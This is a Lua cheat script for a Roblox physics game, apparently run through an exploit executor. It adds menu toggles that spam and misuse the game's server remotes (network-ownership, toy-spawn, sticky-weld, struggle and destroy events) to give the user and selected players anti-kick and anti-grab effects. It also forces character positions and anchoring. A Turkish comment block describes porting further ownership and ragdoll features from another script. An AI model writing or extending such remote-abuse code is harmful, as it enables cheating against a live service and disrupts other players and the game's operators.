ThirdPartyDropdown = ThirdPartyLeft:AddDropdown("ThirdPartyTarget", {
    Values = GetPlayerList(),
    Multi = true,
    Text = "Protect Player(s)",
    Callback = function(v)
        ThirdPartyTargetList = {}
        if type(v) == "table" then
            for s, _ in pairs(v) do
                table.insert(ThirdPartyTargetList, getname(s))
            end
        else
            table.insert(ThirdPartyTargetList, getname(v))
        end
        ThirdPartyTarget = ThirdPartyTargetList[1]
    end,
})

task.spawn(function()
    lastHash = ""
    while task.wait(1) do
        list = GetPlayerList()
        hash = table.concat(list, "|")
        if hash ~= lastHash then
            lastHash = hash
            pcall(function()
                if ThirdPartyDropdown then
                    ThirdPartyDropdown:SetValues(list)
                end
            end)
        end
    end
end)

ThirdPartyLeft:AddButton({
    Text = "Refresh Players",
    Func = function()
        pcall(function()
            list = GetPlayerList()
            if ThirdPartyDropdown then
                ThirdPartyDropdown:SetValues(list)
            end
            count = #list
            if count > 0 then
            else
            end
        end)
    end,
})

AntiKickToyList = {
    ["Japanese Lantern"] = "JapaneseLantern",
    ["Spooky Candle"] = "SpookyCandle1",
    ["Clock"] = "ClockAlarm"
}

DropdownValues = {}
for k in pairs(AntiKickToyList) do
    table.insert(DropdownValues, k)
end
table.sort(DropdownValues)

ThirdPartySelectedToy = AntiKickToyList["Clock"] or AntiKickToyList[DropdownValues[1]]

ThirdPartyLeft:AddDropdown("ThirdPartyAntiKickItemSelect", {
    Values = DropdownValues,
    Default = 4,
    Multi = false,
    Text = "Anti Kick Item",
    Callback = function(Value)
        ThirdPartySelectedToy = AntiKickToyList[Value]
    end
})

GetMagnitude = function(Part1, Part2)
    return (Part1.Position - Part2.Position).Magnitude
end

FWD = function(parent, part, timeOffset)
    return parent:FindFirstChild(part) or parent:WaitForChild(part, timeOffset or 1)
end

CFP = function(parent, part)
    return parent:FindFirstChild(part) ~= nil
end

CheckNetworkOwnerOnPart = function(Part)
    po = Part:FindFirstChild("PartOwner")
    return po and po.Value == plr.Name
end

sno = function(part)
    pcall(function()
        grabEvents = RS:FindFirstChild("GrabEvents")
        setNetOwner = grabEvents and grabEvents:FindFirstChild("SetNetworkOwner")
        if setNetOwner then
            setNetOwner:FireServer(part, part.CFrame)
        end
    end)
end

CheckForHome = function()
    plotItems = workspace:FindFirstChild("PlotItems")
    plots = workspace:FindFirstChild("Plots")
    if plots and plotItems then
        for i = 1, 5 do
            Plot = plots:FindFirstChild("Plot"..i)
            if Plot then
                sign = Plot:FindFirstChild("PlotSign")
                owners = sign and sign:FindFirstChild("ThisPlotsOwners")
                if owners then
                    for _,v in pairs(owners:GetChildren()) do
                        if v.Value == plr.Name then
                            return plotItems:FindFirstChild("Plot"..i)
                        end
                    end
                end
            end
        end
    end
    return nil
end

SpawnToy = function(ToyName)
    InPlot = plr:FindFirstChild("InPlot")
    InOwnedPlot = plr:FindFirstChild("InOwnedPlot")
    CanSpawnToy = plr:FindFirstChild("CanSpawnToy")
    inv = workspace:FindFirstChild(plr.Name.."SpawnedInToys")
    if InPlot and InPlot.Value and InOwnedPlot and not InOwnedPlot.Value then
        InPlot:GetPropertyChangedSignal("Value"):Wait()
    end
    if CanSpawnToy and not CanSpawnToy.Value then
        CanSpawnToy:GetPropertyChangedSignal("Value"):Wait()
    end
    spawnHRP = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
    if not spawnHRP then return nil end
    SpawnCF = spawnHRP.CFrame * CFrame.new(0, 14, 20)
    Container = (InOwnedPlot and InOwnedPlot.Value) and CheckForHome() or inv
    if not Container then return nil end
    spawnState = {}
    spawnState.found = nil
    spawnState.conn = Container.ChildAdded:Connect(function(child)
        if child.Name == ToyName then
            spawnState.found = child
        end
    end)
    task.spawn(function()
        pcall(function()
            menuToys = RS:FindFirstChild("MenuToys")
            spawnRemote = menuToys and menuToys:FindFirstChild("SpawnToyRemoteFunction")
            if spawnRemote then
                spawnRemote:InvokeServer(ToyName, SpawnCF, Vector3.zero)
            end
        end)
    end)
    startTime = tick()
    repeat task.wait() until spawnState.found or (tick() - startTime) > 2.5
    if spawnState.conn then spawnState.conn:Disconnect() end
    return spawnState.found
end

FindTargetPCLD = function(targetHRP, targetName)
    if not targetHRP or not targetHRP.Parent then return end
    if ThirdPartyPCLDConns[targetName] then
        pcall(function() ThirdPartyPCLDConns[targetName]:Disconnect() end)
    end
    ThirdPartyPCLDList[targetName] = nil
    ThirdPartyPCLDConns[targetName] = RunService.Heartbeat:Connect(function()
        if ThirdPartyPCLDList[targetName] or not targetHRP or not targetHRP.Parent then
            if ThirdPartyPCLDConns[targetName] then
                pcall(function() ThirdPartyPCLDConns[targetName]:Disconnect() end)
                ThirdPartyPCLDConns[targetName] = nil
            end
            return
        end
        for _, v in pairs(workspace:GetChildren()) do
            if v.Name == "PlayerCharacterLocationDetector" and v:IsA("BasePart") then
                if GetMagnitude(v, targetHRP) <= 2 then
                    ThirdPartyPCLDList[targetName] = v
                    break
                end
            end
        end
    end)
end

ThirdPartyLeft:AddToggle("ThirdPartyAntiKick", {
    Text = "Give Anti Kick (Shuriken)",
    Default = false,
    Callback = function(v)
        ThirdPartyAntiKickActive = v
        if v then
            if #ThirdPartyTargetList == 0 then
                ThirdPartyAntiKickActive = false
                Toggles.ThirdPartyAntiKick:SetValue(false)
                return
            end
            task.spawn(function()
                SK = {}
                SK.shurikens = {}
                while ThirdPartyAntiKickActive and task.wait(0.5) do
                    for shurikenName, shurikenObj in pairs(SK.shurikens) do
                        stillSelected = false
                        for _, n in ipairs(ThirdPartyTargetList) do
                            if n == shurikenName then
                                stillSelected = true
                                break
                            end
                        end
                        if not stillSelected or not shurikenObj or not shurikenObj.Parent then
                            pcall(function()
                                if shurikenObj and shurikenObj.Parent then
                                    DestroyToy:FireServer(shurikenObj)
                                end
                            end)
                            SK.shurikens[shurikenName] = nil
                        end
                    end
                    for _, targetName in ipairs(ThirdPartyTargetList) do
                        SK.targetPlayer = Players:FindFirstChild(targetName)
                        if not SK.targetPlayer or not SK.targetPlayer.Character then continue end
                        SK.targetChar = SK.targetPlayer.Character
                        SK.targetHRP = SK.targetChar:FindFirstChild("HumanoidRootPart")
                        if not SK.targetHRP then continue end
                        if SK.shurikens[targetName] then
                            SK.shu = SK.shurikens[targetName]
                            SK.part = SK.shu:FindFirstChild("StickyPart")
                            if not SK.part then continue end
                            SK.firePart = SK.targetHRP:FindFirstChild("FirePlayerPart")
                            pcall(function()
                                if SK.part:FindFirstChild("PartOwner") and SK.part.PartOwner.Value ~= plr.Name then
                                    sno(SK.part)
                                end
                                if SK.part:FindFirstChild("StickyWeld") and SK.part.StickyWeld.Part1 ~= SK.firePart then
                                    sno(SK.part)
                                    if SK.firePart then
                                        StickyEvent:FireServer(SK.part, SK.firePart, CFrame.new(0,0,0,1,0,0,0,0,-1,0,1,0))
                                    end
                                end
                                if (SK.part.Position - SK.targetHRP.Position).Magnitude > 50 then
                                    SK.shu:PivotTo(SK.targetHRP.CFrame * CFrame.new(5, 10, 5))
                                end
                            end)
                        else
                            SK.myHRP = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
                            SK.spawnCf = SK.myHRP and SK.myHRP.CFrame * CFrame.new(0, 3, 0) or SK.targetHRP.CFrame * CFrame.new(5, 10, 5)
                            SK.shu = spawntoy("NinjaShuriken", SK.spawnCf)
                            if not SK.shu then continue end
                            SK.shu.Name = "ThirdPartyShuriken_" .. targetName
                            SK.part = SK.shu:WaitForChild("StickyPart", 1)
                            if not SK.part then
                                pcall(function() DestroyToy:FireServer(SK.shu) end)
                                continue
                            end
                            sno(SK.part)
                            SK.ownerWait = 0
                            while not SK.part:FindFirstChild("PartOwner") and SK.ownerWait < 2 do
                                task.wait(0.1)
                                sno(SK.part)
                                SK.ownerWait = SK.ownerWait + 0.1
                            end
                            if not SK.part:FindFirstChild("PartOwner") then
                                pcall(function() DestroyToy:FireServer(SK.shu) end)
                                continue
                            end
                            SK.firePart = SK.targetHRP:FindFirstChild("FirePlayerPart")
                            if SK.firePart then
                                StickyEvent:FireServer(SK.part, SK.firePart, CFrame.new(0,0,0,1,0,0,0,0,-1,0,1,0))
                            end
                            SK.shurikens[targetName] = SK.shu
                        end
                    end
                end
                for _, shurikenObj in pairs(SK.shurikens) do
                    pcall(function()
                        if shurikenObj and shurikenObj.Parent then
                            DestroyToy:FireServer(shurikenObj)
                        end
                    end)
                end
                SK.shurikens = {}
            end)
        else
            ThirdPartyAntiKickActive = false
        end
    end,
})

ThirdPartyLeft:AddToggle("ThirdPartyAntiGrab", {
    Text = "Give Anti Grab",
    Default = false,
    Callback = function(v)
        ThirdPartyAntiGrabActive = v
        if v then
            if #ThirdPartyTargetList == 0 then
                ThirdPartyAntiGrabActive = false
                return
            end
            task.spawn(function()
                AG = {}
                AG.returnPoses = {}
                while ThirdPartyAntiGrabActive and task.wait(0.05) do
                    for _, targetName in ipairs(ThirdPartyTargetList) do
                        AG.targetPlayer = Players:FindFirstChild(targetName)
                        if not AG.targetPlayer or not AG.targetPlayer.Character then continue end
                        AG.targetChar = AG.targetPlayer.Character
                        AG.targetHRP = AG.targetChar:FindFirstChild("HumanoidRootPart")
                        AG.targetHum = AG.targetChar:FindFirstChild("Humanoid")
                        if not AG.targetHRP or not AG.targetHum then continue end
                        if AG.targetHum.SeatPart == nil and AG.targetHum:GetState() ~= Enum.HumanoidStateType.Dead then
                            AG.returnPoses[targetName] = AG.targetHRP.CFrame
                        end
                        if AG.targetHum.SeatPart then
                            AG.seat = AG.targetHum.SeatPart
                            if AG.seat.Parent and (AG.seat.Parent.Name ~= "CreatureBlobman" and AG.seat.Parent.Name ~= "TractorGreen" and not AG.seat.Parent.Name:find("Train")) then
                                pcall(function()
                                    Struggle:FireServer()
                                    sno(AG.targetHRP)
                                    task.wait(0.03)
                                    DestroyLine:FireServer(AG.targetHRP)
                                    task.wait(0.03)
                                    AG.targetHRP.Anchored = true
                                    AG.targetHRP.AssemblyLinearVelocity = Vector3.zero
                                    AG.targetHRP.AssemblyAngularVelocity = Vector3.zero
                                    task.wait(0.05)
                                    AG.targetHRP.Anchored = false
                                    AG.targetHum.Sit = false
                                    AG.targetHum.PlatformStand = false
                                    AG.targetHum:ChangeState(Enum.HumanoidStateType.Running)
                                    if AG.returnPoses[targetName] then
                                        AG.targetHRP.CFrame = AG.returnPoses[targetName]
                                        stvel(AG.targetHRP)
                                    end
                                    Struggle:FireServer()
                                end)
                            end
                        end
                    end
                end
            end)
        end
    end,
})

ThirdPartyLeft:AddToggle("ThirdPartyAntiKickItem", {
    Text = "Give Anti Kick [ITEM]",
    Default = false,
    Callback = function(Val)
        ThirdPartyAntiKickItemActive = Val
        if Val then
            if #ThirdPartyTargetList == 0 then
                ThirdPartyAntiKickItemActive = false
                Toggles.ThirdPartyAntiKickItem:SetValue(false)
                return
            end
            task.spawn(function()
                IK = {}
                IK.items = {}
                IK.hitboxes = {}
                while ThirdPartyAntiKickItemActive and task.wait(0.05) do
                    IK.inv = workspace:FindFirstChild(plr.Name.."SpawnedInToys")
                    IK.destroyToy = RS:FindFirstChild("MenuToys") and RS.MenuToys:FindFirstChild("DestroyToy")
                    if not IK.inv then continue end
                    for _, targetName in ipairs(ThirdPartyTargetList) do
                        IK.targetPlayer = Players:FindFirstChild(targetName)
                        if not IK.targetPlayer then continue end
                        IK.targetChar = IK.targetPlayer.Character
                        if not IK.targetChar then continue end
                        IK.targetHRP = IK.targetChar:FindFirstChild("HumanoidRootPart")
                        IK.targetHum = IK.targetChar:FindFirstChild("Humanoid")
                        if not IK.targetHRP or not IK.targetHum or IK.targetHum.Health <= 0 then continue end
                        IK.itemKey = "ThirdPartyItem_" .. targetName
                        if not IK.items[targetName] or not IK.items[targetName].Parent then
                            IK.existing = IK.inv:FindFirstChild(IK.itemKey)
                            if IK.existing then
                                IK.items[targetName] = IK.existing
                            else
                                IK.newItem = SpawnToy(ThirdPartySelectedToy)
                                if not IK.newItem then continue end
                                IK.newItem.Name = IK.itemKey
                                IK.items[targetName] = IK.newItem
                                for _,v in pairs(IK.newItem:GetDescendants()) do
                                    if v:IsA("BasePart") then
                                        v.CanCollide = false
                                        v.Transparency = 0.8
                                        v.Color = Color3.fromRGB(255, 255, 255)
                                    end
                                end
                            end
                        end
                        IK.Item = IK.items[targetName]
                        if not IK.Item then continue end
                        if not IK.hitboxes[targetName] or not IK.hitboxes[targetName].Parent then
                            IK.hitboxes[targetName] = IK.Item:FindFirstChild("Hitbox")
                        end
                        if not IK.hitboxes[targetName] then continue end
                        IK.SoundPart = IK.hitboxes[targetName]
                        if not CheckNetworkOwnerOnPart(IK.SoundPart) then
                            sno(IK.SoundPart)
                        end
                        if not ThirdPartyPCLDList[targetName] and not ThirdPartyPCLDConns[targetName] then
                            FindTargetPCLD(IK.targetHRP, targetName)
                        end
                        IK.targetPart = ThirdPartyPCLDList[targetName] or IK.targetHRP:FindFirstChild("FirePlayerPart") or IK.targetHRP
                        if IK.SoundPart and IK.targetPart then
                            IK.SoundPart.CFrame = IK.targetPart.CFrame
                            IK.SoundPart.AssemblyLinearVelocity = Vector3.zero
                            IK.SoundPart.AssemblyAngularVelocity = Vector3.zero
                        end
                    end
                end
                for _, conn in pairs(ThirdPartyPCLDConns) do
                    pcall(function() conn:Disconnect() end)
                end
                ThirdPartyPCLDConns = {}
                ThirdPartyPCLDList = {}
                IK.items = {}
                IK.hitboxes = {}
            end)
        else
            for _, conn in pairs(ThirdPartyPCLDConns) do
                pcall(function() conn:Disconnect() end)
            end
            ThirdPartyPCLDConns = {}
            ThirdPartyPCLDList = {}
            task.spawn(function()
                itemCleanupInv = workspace:FindFirstChild(plr.Name.."SpawnedInToys")
                itemCleanupDestroy = RS:FindFirstChild("MenuToys") and RS.MenuToys:FindFirstChild("DestroyToy")
                if itemCleanupInv and itemCleanupDestroy then
                    for _,v in pairs(itemCleanupInv:GetChildren()) do
                        if v.Name:find("ThirdPartyItem_") then
                            pcall(function() itemCleanupDestroy:FireServer(v) end)
                        end
                    end
                end
            end)
        end
    end
})

_G.ShurikenAntiKick = false

function StartPolarAntiKick()
    function ClearKunai()
        inv = workspace:FindFirstChild(plr.Name.."SpawnedInToys")
        destroyrem = game.ReplicatedStorage:FindFirstChild("MenuToys") and game.ReplicatedStorage.MenuToys:FindFirstChild("DestroyToy")
        if inv and destroyrem then
            for _, v in pairs(inv:GetChildren()) do
                if v.Name == "AntiKick" or v.Name == "NinjaShuriken" then
                    pcall(function() destroyrem:FireServer(v) end)
                end
            end
        end
    end
    while _G.ShurikenAntiKick do
        pcall(function()
            setOwner = game:GetService("ReplicatedStorage"):WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner")
            stickyEvent = game:GetService("ReplicatedStorage"):WaitForChild("PlayerEvents"):WaitForChild("StickyPartEvent")
            spawnRemote = game:GetService("ReplicatedStorage").MenuToys.SpawnToyRemoteFunction
            destroyrem = game:GetService("ReplicatedStorage"):WaitForChild("MenuToys"):WaitForChild("DestroyToy")
            canSpawn = plr:WaitForChild("CanSpawnToy")
            function getHRP()
                if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                    return plr.Character.HumanoidRootPart
                else
                    character = plr.CharacterAdded:Wait()
                    return character:WaitForChild("HumanoidRootPart")
                end
            end
            function CheckForHome()
                if not workspace.PlotItems.PlayersInPlots:FindFirstChild(plr.Name) then
                    return false
                end
                for _, v in pairs(workspace.Plots:GetChildren()) do
                    sign = v:FindFirstChild("PlotSign")
                    owners = sign and sign:FindFirstChild("ThisPlotsOwners")
                    if owners then
                        for _, b in pairs(owners:GetChildren()) do
                            if b.Value == plr.Name then
                                folder = workspace.PlotItems:FindFirstChild(v.Name)
                                if folder then return true, folder end
                            end
                        end
                    end
                end
                return false
            end
            function StickKunai(kunai)
                if not kunai or not kunai:FindFirstChild("StickyPart") then return end
                currentHRP = getHRP()
                if not currentHRP then return end
                if kunai:FindFirstChild("SoundPart") then
                    if not kunai.SoundPart:FindFirstChild("PartOwner") or kunai.SoundPart.PartOwner.Value ~= plr.Name then
                        setOwner:FireServer(kunai.SoundPart, kunai.SoundPart.CFrame)
                    end
                end
                firePart = currentHRP:FindFirstChild("FirePlayerPart") or currentHRP:WaitForChild("FirePlayerPart", 5)
                if firePart then
                    stickyEvent:FireServer(kunai.StickyPart, firePart, CFrame.new(0,0,0) * CFrame.Angles(0,math.rad(90),math.rad(90)))
                end
                for _, obj in pairs(kunai:GetChildren()) do
                    if obj.Name == "Pyramid" then
                        obj.CanTouch = false; obj.CanCollide = false; obj.CanQuery = false; obj.Transparency = 0
                    elseif obj.Name == "Main" then
                        obj.CanTouch = false; obj.CanCollide = false; obj.CanQuery = false; obj.Transparency = 0
                    elseif obj:IsA("BasePart") then
                        obj.CanTouch = false; obj.CanCollide = false; obj.CanQuery = false; obj.Transparency = 1
                    end
                end
            end
            local function SpawnToy(name)
                t = tick()
                while not canSpawn.Value do
                    if not _G.ShurikenAntiKick or tick() - t > 5 then return nil end
                    task.wait(0.1)
                end
                currentHRP = getHRP()
                if currentHRP then
                    task.spawn(function()
                        pcall(function()
                            spawnRemote:InvokeServer(name, currentHRP.CFrame * CFrame.new(0, 12, 20), Vector3.new(0,0,0))
                        end)
                    end)
                end
                boolik, house = CheckForHome()
                inv = workspace:FindFirstChild(plr.Name.."SpawnedInToys")
                if boolik and house then
                    return house:WaitForChild(name, 2)
                elseif not workspace.PlotItems.PlayersInPlots:FindFirstChild(plr.Name) and inv then
                    return inv:WaitForChild(name, 2)
                end
                return nil
            end
            if not plr.Character or not plr.Character:FindFirstChild("Humanoid") or plr.Character.Humanoid.Health <= 0 then
                task.wait(0.1)
                return
            end
            inv = workspace:FindFirstChild(plr.Name.."SpawnedInToys")
            kunai = inv and inv:FindFirstChild("NinjaShuriken")
            if workspace.PlotItems.PlayersInPlots:FindFirstChild(plr.Name) then
                boolik, house = CheckForHome()
                if boolik and house and workspace.Plots:FindFirstChild(house.Name) then
                    sign = workspace.Plots[house.Name]:FindFirstChild("PlotSign")
                    if sign and sign.ThisPlotsOwners.Value.TimeRemainingNum.Value > 89 then
                        kunai = SpawnToy("NinjaShuriken")
                        if kunai == nil then return end
                        kunai.Name = "AntiKick"
                        StickKunai(kunai)
                    end
                end
            end
            if not kunai then
                if workspace.PlotItems.PlayersInPlots:FindFirstChild(plr.Name) then return end
                kunai = SpawnToy("NinjaShuriken")
                if kunai == nil then return end
                kunai.Name = "AntiKick"
                if not kunai then return end
            end
            repeat
                if kunai and kunai:FindFirstChild("StickyPart") and kunai.StickyPart.CanTouch == true then
                    StickKunai(kunai)
                    kunai.Name = "AntiKick"
                end
                task.wait(0.3)
            until not kunai or not _G.ShurikenAntiKick or not kunai:FindFirstChild("StickyPart") or kunai.StickyPart.CanTouch == false
                or not plr.Character or not plr.Character:FindFirstChild("HumanoidRootPart")
                or not kunai:FindFirstChild("StickyPart")
                or (plr.Character.HumanoidRootPart.Position - kunai.StickyPart.Position).Magnitude >= 20
            if not kunai or not kunai:FindFirstChild("StickyPart") or not plr.Character or not plr.Character:FindFirstChild("HumanoidRootPart") or (plr.Character.HumanoidRootPart.Position - kunai.StickyPart.Position).Magnitude >= 20 then
                ClearKunai()
            end
            pcall(function()
                repeat
                    task.wait(0.05)
                until not _G.ShurikenAntiKick or not plr.Character or not plr.Character:FindFirstChild("Humanoid") or not kunai or not kunai:FindFirstChild("StickyPart") or not kunai.StickyPart:FindFirstChild("StickyWeld") or not kunai.StickyPart.StickyWeld.Part1
                if not kunai or not kunai:FindFirstChild("StickyPart") or (plr.Character and plr.Character:FindFirstChild("Humanoid") and plr.Character.Humanoid.Health <= 0) or not kunai["StickyPart"]:FindFirstChild("StickyWeld").Part1 then
                    ClearKunai()
                end
            end)
        end)
        task.wait()
    end
    ClearKunai()
end

ClassicDefense = Tabs.DefenseTab:AddLeftGroupbox("Classic Defense")

ClassicDefense:AddLabel("Core Protection", true, Color3.fromRGB(255, 160, 0))

local autoStruggleConn = nil
local AntiGrabEnabled = false
local HeldConnection = nil

local StruggleEvent = Services.rs.CharacterEvents:WaitForChild("Struggle")

local AntiGrab = false
local AntiGrabProc = false
local AGWalk = false
local Cons = {}
local AGCharAddedConn = nil

local function DiscAll()
    for k, v in pairs(Cons) do
        if v then v:Disconnect() end
    end
    table.clear(Cons)
end

local function ApplyAntiGrab(char)
    if not char or not AntiGrab then return end
    local hrp = char:WaitForChild("HumanoidRootPart", 5)
    local hum = char:WaitForChild("Humanoid", 5)
    local head = char:WaitForChild("Head", 5)
    local torso = char:WaitForChild("Torso", 5) or char:WaitForChild("UpperTorso", 5)
    if not (hrp and hum and head and torso) then return end
    local beingHeld = char:FindFirstChild("BeingHeld")
    local wasRagdolled = false
    Cons["AGCFrameLimbing"] = RunService.Heartbeat:Connect(function()
        local ragdolled = hum:FindFirstChild("Ragdolled")
        if ragdolled and ragdolled.Value then
            wasRagdolled = true
            local leftArm = char:FindFirstChild("Left Arm")
            local rightArm = char:FindFirstChild("Right Arm")
            local leftLeg = char:FindFirstChild("Left Leg")
            local rightLeg = char:FindFirstChild("Right Leg")
            if leftArm then leftArm.CFrame = torso.CFrame * CFrame.new(-1.5, 0, 0); leftArm.CanCollide = false end
            if rightArm then rightArm.CFrame = torso.CFrame * CFrame.new(1.5, 0, 0); rightArm.CanCollide = false end
            if leftLeg then leftLeg.CFrame = torso.CFrame * CFrame.new(-0.5, -2, 0); leftLeg.CanCollide = false end
            if rightLeg then rightLeg.CFrame = torso.CFrame * CFrame.new(0.5, -2, 0); rightLeg.CanCollide = false end
        elseif wasRagdolled then
            wasRagdolled = false
            local limbs = {"RightLeg", "LeftLeg", "RightArm", "LeftArm"}
            for _, limbName in ipairs(limbs) do
                local limb = char:FindFirstChild(limbName)
                if limb then limb.CanCollide = true end
            end
        end
    end)
    Cons["AGHead"] = head.ChildAdded:Connect(function(PartOwner)
        if PartOwner.Name == "PartOwner" then
            if not AntiGrabProc then
                AntiGrabProc = true
                hum.Sit = false
                for _ = 1, 20 do
                    pcall(function() StruggleEvent:FireServer(Services.LocalPlayer) end)
                end
                for i = 1, 5 do
                    task.spawn(function() 
                        while (head and head:FindFirstChild("PartOwner")) or (beingHeld and beingHeld.Value) do
                            pcall(function() StruggleEvent:FireServer(Services.LocalPlayer) end)
                            pcall(function() Services.rs.CharacterEvents.RagdollRemote:FireServer(hrp, 0) end)
                            task.wait(0.001)
                        end
                    end)
                end
                task.spawn(function()
                    for _ = 1, 100 do
                        if not ((head and head:FindFirstChild("PartOwner")) or (beingHeld and beingHeld.Value)) then break end
                        pcall(function() StruggleEvent:FireServer(Services.LocalPlayer) end)
                        pcall(function() StruggleEvent:FireServer(Services.LocalPlayer) end)
                        pcall(function() StruggleEvent:FireServer(Services.LocalPlayer) end)
                        pcall(function() StruggleEvent:FireServer(Services.LocalPlayer) end)
                        pcall(function() StruggleEvent:FireServer(Services.LocalPlayer) end)
                        task.wait(0.001)
                    end
                end)
                task.spawn(function()
                    hrp.Anchored = true
                    if not AGWalk then
                        AGWalk = true
                        pcall(function()
                            while (head and head:FindFirstChild("PartOwner")) or (beingHeld and beingHeld.Value) do
                                hrp.CFrame = hrp.CFrame + hum.MoveDirection * 0.43
                                task.wait()
                            end
                        end)
                    end
                    hrp.Anchored = false
                    AntiGrabProc = false
                    AGWalk = false
                end)
            end
        end
    end)
    local weldHRP = hrp:WaitForChild("WeldHRP", 5)
    if weldHRP then
        Cons["AGWeld"] = weldHRP.Changed:Connect(function()
            if hrp.WeldHRP.Enabled then
                task.spawn(function()
                    while hrp.WeldHRP.Enabled and task.wait() do
                        hum.Sit = false
                        hum.AutoRotate = true
                        hum.HipHeight = 1
                        pcall(function() head.CFrame = hrp.CFrame + Vector3.new(0, 1.35, 0) end)
                    end
                    hum.HipHeight = 0
                end)
            end
        end)
    end
end

function StartBestAntiGrab()
    if AntiGrab then return end
    AntiGrab = true
    local char = Services.LocalPlayer.Character
    if char then ApplyAntiGrab(char) end
    AGCharAddedConn = Services.LocalPlayer.CharacterAdded:Connect(function(newChar)
        task.wait(0.5)
        if AntiGrab then ApplyAntiGrab(newChar) end
    end)
end

function StopBestAntiGrab()
    AntiGrab = false
    AntiGrabProc = false
    AGWalk = false
    DiscAll()
    if AGCharAddedConn then AGCharAddedConn:Disconnect() AGCharAddedConn = nil end
end

local TractorEscapeActive = false
local TractorEscapeConn = nil
local TractorEscapeCharConn = nil
local tractorEscapeDebounce = false

function StartTractorEscape()
    if TractorEscapeActive then return end
    TractorEscapeActive = true
    tractorEscapeDebounce = false
    TractorEscapeConn = RunService.Heartbeat:Connect(function()
        local char = Services.LocalPlayer.Character
        if not char then return end
        local head = char:FindFirstChild("Head")
        local partOwner = head and head:FindFirstChild("PartOwner")
        if not partOwner or partOwner.Value == "" then return end
        if tractorEscapeDebounce then return end
        tractorEscapeDebounce = true
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChild("Humanoid")
        local torso = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")
        if not hrp or not hum or hum.Health <= 0 then
            tractorEscapeDebounce = false
            return
        end
        local originalCF = hrp.CFrame
        local CharEvents = ReplicatedStorage:FindFirstChild("CharacterEvents")
        if CharEvents and CharEvents:FindFirstChild("Struggle") then
            pcall(function() CharEvents.Struggle:FireServer(Services.LocalPlayer) end)
        end
        for _, part in pairs(char:GetChildren()) do
            if part:IsA("BasePart") then
                part.Anchored = true
            end
        end
        local isHeld = Services.LocalPlayer:FindFirstChild("IsHeld")
        while isHeld and isHeld.Value and TractorEscapeActive do
            task.wait()
        end
        local inv = workspace:FindFirstChild(Services.LocalPlayer.Name .. "SpawnedInToys")
        local MenuToys = ReplicatedStorage:FindFirstChild("MenuToys")
        local DestroyToy = MenuToys and MenuToys:FindFirstChild("DestroyToy")
        local SpawnToy = MenuToys and MenuToys:FindFirstChild("SpawnToyRemoteFunction")
        if inv and inv:FindFirstChild("antinetowner") and DestroyToy then
            pcall(function() DestroyToy:FireServer(inv.antinetowner) end)
        end
        task.spawn(function()
            if SpawnToy then
                pcall(function() SpawnToy:InvokeServer("TractorGreen", CFrame.new(298, 13, 486), Vector3.zero) end)
            end
        end)
        local tractor = nil
        if inv then
            local startTime = tick()
            repeat 
                tractor = inv:FindFirstChild("TractorGreen")
                task.wait() 
            until tractor or (tick() - startTime > 3)
        end
        if tractor then
            tractor.Name = "antinetowner"
            local seat = tractor:WaitForChild("VehicleSeat", 3)
            if seat then
                for _, part in pairs(char:GetChildren()) do
                    if part:IsA("BasePart") then part.Anchored = false end
                end
                if hum then hum.Sit = false end
                for i = 1, 15 do
                    if hum and seat then seat:Sit(hum) end
                    if hrp and seat then hrp.CFrame = seat.CFrame end
                    if torso and seat then torso.CFrame = seat.CFrame end
                    task.wait()
                end
                if hum then
                    hum.Sit = false
                    pcall(function() hum:ChangeState(Enum.HumanoidStateType.GettingUp) end)
                end
                if DestroyToy then
                    pcall(function() DestroyToy:FireServer(tractor) end)
                end
            end
        end
        for _, part in pairs(char:GetChildren()) do
            if part:IsA("BasePart") then
                part.Anchored = false
            end
        end
        if hrp then hrp.CFrame = originalCF end
        if torso then torso.CFrame = originalCF end
        for _, part in pairs(char:GetChildren()) do
            if part:IsA("BasePart") then
                part.Velocity = Vector3.zero
                part.RotVelocity = Vector3.zero
                part.AssemblyLinearVelocity = Vector3.zero
                part.AssemblyAngularVelocity = Vector3.zero
            end
        end
        tractorEscapeDebounce = false
    end)
    if type(AGDiscAll) == "function" then pcall(AGDiscAll) end
    if type(ApplyAntiGrab) == "function" then pcall(ApplyAntiGrab, Services.LocalPlayer.Character) end
    TractorEscapeCharConn = Services.LocalPlayer.CharacterAdded:Connect(function()
        task.wait(0.5)
        if TractorEscapeActive then
            if type(AGDiscAll) == "function" then pcall(AGDiscAll) end
            if type(ApplyAntiGrab) == "function" then pcall(ApplyAntiGrab, Services.LocalPlayer.Character) end
        end
    end)
end

function StopTractorEscape()
    TractorEscapeActive = false
    tractorEscapeDebounce = false
    if TractorEscapeConn then
        TractorEscapeConn:Disconnect()
        TractorEscapeConn = nil
    end
    if TractorEscapeCharConn then
        TractorEscapeCharConn:Disconnect()
        TractorEscapeCharConn = nil
    end
    local inv = workspace:FindFirstChild(Services.LocalPlayer.Name .. "SpawnedInToys")
    local DestroyToy = ReplicatedStorage:FindFirstChild("MenuToys") and ReplicatedStorage.MenuToys:FindFirstChild("DestroyToy")
    if inv and inv:FindFirstChild("antinetowner") and DestroyToy then
        pcall(function() DestroyToy:FireServer(inv.antinetowner) end)
    end
    if type(AGDiscAll) == "function" then pcall(AGDiscAll) end
end

-- =====================================================================
-- [KOZMOZ PORT - ALTYAPI] musa(4)'ten tasinan koruma ozelliklerinin
-- ortak altyapisi. Kaynak: musa(4) 402-421 (State), 421-561
-- (RemoteDispatcher), 629-683 (Utility), 115-128 (gucci spawn guard).
-- Asagidaki portlar bu bolumu kullanir: Loop/Perm Ragdoll,
-- Anti Kill/Anti Hold (Hamburger), Anti Ownership 1-2, Pos Lock,
-- Gucci modu, Anti Grab metotlari, Anti Blobman Kill.
-- Amac: remote sayisini tek noktadan sinirlayip kick/kosu korumasi.
-- =====================================================================
KozState = {
    isRespawning = false,
    connections = {},
    struggleTasks = {},
    antiOwnershipConns = {},
    antiRagBlobConns = {},
    loopRagdollTask = nil,
    loopRagdollCharAdded = nil,
    permRagdollConn = nil,
    permRagdollCharAdded = nil,
    antiKillSpamConnection = nil,
    antiHoldSpamConnection = nil,
    antiBlobmanKillConn = nil,
}
getgenv().KozState = KozState
KozFlags = {
    -- musa(4) 215 satirindaki varsayilanlar (LoopRagdoll hizi)
    LoopRagdollSpeed = 0.15,
}
getgenv().KozFlags = KozFlags
KozFeature = {}
